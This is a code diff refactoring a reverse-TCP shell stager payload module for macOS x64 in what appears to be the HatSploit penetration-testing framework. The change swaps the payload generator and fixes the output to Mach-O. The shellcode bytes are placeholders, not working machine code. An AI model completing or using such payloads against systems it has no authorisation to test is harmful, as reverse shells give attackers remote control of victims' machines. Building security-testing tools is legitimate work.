@@ -25,11 +25,11 @@
 #
 
 from core.lib.payload import Payload
-from utils.payload.payload import PayloadGenerator
+from utils.hatvenom.hatvenom import HatVenom
 from utils.tcp.tcp import TCPClient
 
 
-class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
+class HatSploitPayload(Payload, HatVenom, TCPClient):
     details = {
         'Category': "stager",
         'Name': "macOS x64 Shell Reverse TCP",
@@ -62,31 +62,24 @@ class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
             'Value': 8888,
             'Type': "port",
             'Required': True
-        },
-        'FORMAT': {
-            'Description': "Executable format.",
-            'Value': "macho",
-            'Type': None,
-            'Required': True
         }
     }
 
     def run(self):
-        local_host, local_port, executable_format = self.parse_options(self.options)
+        local_host, local_port = self.parse_options(self.options)
 
-        local_host = self.host_to_bytes(local_host)
-        local_port = self.port_to_bytes(local_port)
-
-        if executable_format not in self.formats.keys():
-            self.output_error("Invalid executable format!")
-            return
+        offsets = {
+            'lhost': local_host,
+            'lport': local_port
+        }
 
         self.output_process("Generating shellcode...")
         shellcode = (
-            b""
+            b":lhost:ip:"
+            b":lport:port:"
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate(executable_format, 'x64', shellcode)
+        payload = self.generate('macho', 'x64', shellcode, offsets)
 
         return payload
